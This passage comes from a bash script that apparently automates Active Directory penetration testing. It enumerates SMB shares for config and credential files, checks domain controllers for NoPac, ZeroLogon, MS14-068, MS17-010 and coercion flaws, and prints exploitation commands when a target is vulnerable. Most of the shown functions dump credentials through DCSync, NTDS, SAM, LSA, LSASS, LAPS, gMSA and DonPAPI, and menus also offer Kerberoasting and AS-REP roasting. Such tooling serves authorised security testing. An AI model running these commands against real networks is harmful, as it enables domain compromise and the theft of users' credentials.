            for i in $(/bin/cat ${servers_smb_list} | grep -v ":"); do
                echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
                if [ "${kerb_bool}" == true ] ; then
                    echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
                else
                    if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] smbmap does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                    current_dir=$(pwd)
                    mkdir -p ${output_dir}/Shares/SharesDump/${i}
                    cd ${output_dir}/Shares/SharesDump/${i}
                    ${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_files_${dc_domain}_${i}.txt 2>&1
                    cd ${current_dir}
                fi
            done
        fi
    fi
    echo -e ""
}

shares_cme () {
    echo -e "${BLUE}[*] Enumerating Shares using crackmapexec ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --shares 2>&1 | tee -a ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
    echo -e ""
}

spider_cme () {
    echo -e "${BLUE}[*] Spidering Shares using crackmapexec ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>&1 | tee -a ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
    echo -e ""
}

keepass_scan () {
    echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    for i in $(/bin/cat ${servers_smb_list}); do
        echo -e "${CYAN}[*] keepass_discover of ${i} ${NC}"
        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M keepass_discover 2>&1 | tee -a ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
    done
    echo -e ""
}

###### Vulnerability checks
nopac_check () {
    echo -e "${BLUE}[*] NoPac check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M nopac 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
        if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
            echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
            echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
        fi
    done
    echo -e ""
}

petitpotam_check () {
    echo -e "${BLUE}[*] PetitPotam check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M petitpotam 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
    done
    echo -e ""
}

dfscoerce_check () {
    echo -e "${BLUE}[*] dfscoerce check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M dfscoerce 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
    done
    echo -e ""
}

zerologon_check () {
    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M zerologon 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
    done
    if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator"
        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip"
        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>"
    fi
    echo -e ""
}

ms14-068_check () {
    echo -e "${BLUE}[*] MS14-068 check ${NC}"
    if [ ! -f "${impacket_goldenPac}" ]; then
        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos tickets${NC}"
        else
            if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] impacket's goldenPac does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
            ${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip} 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
            if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)! Follow steps below for exploitation:${NC}"
                echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
            fi
        fi
    fi
    echo -e ""
}

ms17-010_check () {
    echo -e "${BLUE}[*] MS17-010 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
    echo -e ""
}

spooler_check () {
    echo -e "${BLUE}[*] Print Spooler check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
    echo -e ""
}

webdav_check () {
    echo -e "${BLUE}[*] WebDAV check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
    echo -e ""
}

shadowcoerce_check () {
    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
    echo -e ""
}

smbsigning_check () {
    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --gen-relay-list ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
    if [ ! -s ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt ]; then
        echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
    fi
    echo -e ""
}

ntlmv1_check () {
    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
    echo -e ""
}

runasppl_check () {
    echo -e "${BLUE}[*] runasppl check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
    echo -e ""
}

#MSSQL scan
mssql_enum () {
    if [ ! -f "${windapsearch}" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
    else
        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
            ${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
        fi
        if [ "${nullsess_bool}" == false ]; then
            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}

        fi
        for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
            grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >> ${sql_ip_list}
        done
        if [ ! -f "${sql_ip_list}" ] ; then
             echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
        else
            ${crackmapexec} ${cme_verbose} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv 2>&1 | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
        fi
    fi
    echo -e ""
}

###### Password Dump
laps_dump () {
    echo -e "${BLUE}[*] LAPS Dump${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
    echo -e ""
}

gmsa_dump () {
    echo -e "${BLUE}[*] gMSA Dump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
    else
        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" --gmsa 2>&1 | tee ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
    fi
    echo -e ""
}

secrets_dump_dcsync () {
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
        else
            ${impacket_secretsdump} ${argument_imp}@${target} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

secrets_dump () {
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                ${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

ntds_dump () {
    echo -e "${BLUE}[*] Dumping NTDS using crackmapexec${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
    else
        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --ntds | tee -a ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt
    fi
    echo -e ""
}

sam_dump () {
    echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --sam | tee -a ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

lsa_dump () {
    echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --lsa | tee -a ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

lsassy_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M lsassy 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

handlekatz_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M handlekatz 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

procdump_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M procdump 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

nanodump_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M nanodump 2>&1 | tee -a ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

donpapi_dump () {
    if [ ! -f "${donpapi}" ] ; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            smb_scan
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                ${donpapi} ${argument_donpapi}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
            done
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

hekatomb_dump () {
    if [ ! -f "${hekatomb}" ] ; then
        echo -e "${RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support kerberos tickets${NC}"
        else
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            ${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
            cd ${current_dir} 
        fi
    fi
    echo -e ""
}

masky_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
            ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M adcs --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
        fi
        pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
        pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
        if [ ! "${pki_server}" == "" ] && [ ! "${pki_ca}" == "" ]; then
            if [ "${kerb_bool}" == true ]; then
                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
                curr_targets="Domain Controllers"
            fi
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
                ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>&1 | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
            done
        else
            echo -e "${PURPLE}[-] No ADCS servers found. If ADCS servers exist, re-run ADCS enumeration and try again.${NC}"
        fi

    fi
    echo -e ""
}

certsync_ntds_dump () {
    if [ ! -f "${certsync}" ] ; then
        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
    else
        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
            ${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

ad_enum () {
    bhd_enum
    ldapdomaindump_enum
    enum4linux_enum
    cme_rpc_enum
    cme_ldap_enum
    deleg_enum_imp
    certi_py_enum
    certipy_enum
    silenthound_enum
    windapsearch_enum
    ldeep_enum
    ridbrute_attack
    userpass_cme_check
    pre2k_check
}

kerberos () {
    kerbrute_enum
    userpass_kerbrute_check
    asrep_attack
    asreprc4_attack
    kerberoast_attack
    targetedkerberoast_attack
    john_crack_asrep
    john_crack_kerberoast
}

scan_shares () {
    smb_map
    shares_cme
    spider_cme
    keepass_scan
}

pwd_dump () {
    laps_dump
    gmsa_dump
    secrets_dump
    lsassy_dump
    donpapi_dump
}

vuln_checks () {
    nopac_check
    petitpotam_check
    zerologon_check
    ms14-068_check
    ms17-010_check
    spooler_check
    webdav_check
    dfscoerce_check
    shadowcoerce_check
    smbsigning_check
    ntlmv1_check
    runasppl_check
}

print_info () {
    echo -e ${auth_string}
    echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${dc_ip}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}"
    echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
    echo -e "${YELLOW}[i]${NC} Output folder: ${output_dir}"
    echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
}

modify_target () {
    echo -e ""
    echo -e "${YELLOW}[Modify target(s)]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "1) Domain Controllers"
    echo -e "2) All domain servers"
    echo -e "3) File containing list of servers"
    echo -e "4) IP or hostname"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        1)
        curr_targets="Domain Controllers"
        custom_servers=""
        custom_ip=""
        ;;

        2)
        curr_targets="All domain servers"
        custom_servers=""
        custom_ip=""
        ;;

        3)
        curr_targets="File containing list of servers"
        custom_servers=""
        custom_ip=""
        custom_target_scanned=false
        /bin/rm ${custom_servers_list} 2>/dev/null
        read -p ">> " custom_servers </dev/tty
        /bin/cp $custom_servers ${custom_servers_list} 2>/dev/null
        while [ ! -s "${custom_servers_list}" ] ; do
            echo -e "${RED}Invalid servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " custom_servers </dev/tty
            /bin/cp $custom_servers ${custom_servers_list} 2>/dev/null
        done
        ;;

        4)
        curr_targets="IP or hostname"
        custom_servers=""
        custom_ip=""
        custom_target_scanned=false
        /bin/rm ${custom_servers_list} 2>/dev/null
        read -p ">> " custom_ip </dev/tty
        echo -n $custom_ip > ${custom_servers_list} 2>/dev/null
        while [ ! -s "${custom_servers_list}" ] ; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -p ">> " custom_ip </dev/tty
            echo -n $custom_ip > ${custom_servers_list} 2>/dev/null
        done
        ;;

        99)
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        modify_target
        ;;
    esac
}

ad_menu () {
    echo -e ""
    echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------"
    echo -e "A) ALL ACTIVE DIRECTORY ENUMERATIONS"
    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
    echo -e "2) BloodHound Enumeration using DCOnly"
    echo -e "3) ldapdomaindump LDAP Enumeration"
    echo -e "4) enum4linux-ng LDAP-MS-RPC Enumeration"
    echo -e "5) MS-RPC Enumeration using crackmapexec (Users, pass pol, GPP)"
    echo -e "6) LDAP Enumeration using crackmapexec (Users, passnotreq, ADCS, userdesc, maq, ldap-signing, deleg, subnets)"
    echo -e "7) Delegation Enumeration using findDelegation"
    echo -e "8) certi.py ADCS Enumeration"
    echo -e "9) Certipy ADCS Enumeration"
    echo -e "10) SilentHound LDAP Enumeration"
    echo -e "11) windapsearch LDAP Enumeration"
    echo -e "12) ldeep LDAP Enumeration"
    echo -e "13) RID Brute Force (Null session) using crackmapexec"
    echo -e "14) User=Pass check using crackmapexec (Noisy!)"
    echo -e "15) Pre2k computers authentication check (Noisy!)"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        ad_enum
        ad_menu
        ;;

        1)
        bhd_enum
        ad_menu
        ;;

        2)
        bhd_enum_dconly
        ad_menu
        ;;

        3)
        ldapdomaindump_enum
        ad_menu
        ;;

        4)
        enum4linux_enum
        ad_menu
        ;;

        5)
        cme_rpc_enum
        ad_menu;;

        6)
        cme_ldap_enum
        ad_menu;;

        7)
        deleg_enum_imp
        ad_menu;;

        8)
        certi_py_enum
        ad_menu;;

        9)
        certipy_enum
        ad_menu;;

        10)
        silenthound_enum
        ad_menu
        ;;

        11)
        windapsearch_enum
        ad_menu
        ;;

        12)
        ldeep_enum
        ad_menu
        ;;
        
        13)
        ridbrute_attack
        ad_menu;;

        14)
        userpass_cme_check
        ad_menu;;

        15)
        pre2k_check
        ad_menu;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        ad_menu
        ;;
    esac
}

kerberos_menu () {
    echo -e ""
    echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------------"
    echo -e "A) ALL KERBEROS ATTACKS"
    echo -e "1) User Enumeration using kerbrute (Null session)"
    echo -e "2) User=Pass check using kerbrute (Noisy!)"
    echo -e "3) AS REP Roasting Attack using GetNPUsers"
    echo -e "4) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
    echo -e "5) Kerberoast Attack using GetUserSPNs"
    echo -e "6) Targeted Kerberoast Attack (Noisy!)"
    echo -e "7) Cracking AS REP Roast hashes using john the ripper"
    echo -e "8) Cracking Kerberoast hashes using john the ripper"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        kerberos
        kerberos_menu
        ;;

        1)
        kerbrute_enum
        kerberos_menu
        ;;

        2)
        userpass_kerbrute_check
        kerberos_menu
        ;;

        3)
        asrep_attack
        kerberos_menu
        ;;

        4)
        asreprc4_attack
        kerberos_menu
        ;;

        5)
        kerberoast_attack
        kerberos_menu
        ;;

        6)
        targetedkerberoast_attack
        kerberos_menu
        ;;

        7)
        john_crack_asrep
        kerberos_menu
        ;;
        
        8)
        john_crack_kerberoast
        kerberos_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        kerberos_menu
        ;;
    esac
}

shares_menu () {
    echo -e ""
    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) ALL SMB SHARES SCANS"
    echo -e "m) Modify target(s)"
    echo -e "1) SMB shares Scan using smbmap"
    echo -e "2) SMB shares Enumeration using crackmapexec"
    echo -e "3) SMB shares Spidering using crackmapexec "
    echo -e "4) KeePass Discovery using crackmapexec"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        scan_shares
        shares_menu
        ;;

        m)
        modify_target
        shares_menu
        ;;

        1)
        smb_map
        shares_menu
        ;;

        2)
        shares_cme
        shares_menu
        ;;

        3)
        spider_cme
        shares_menu
        ;;

        4)
        keepass_scan
        shares_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        shares_menu
        ;;
    esac
 
}

vulns_menu () {
    echo -e ""
    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
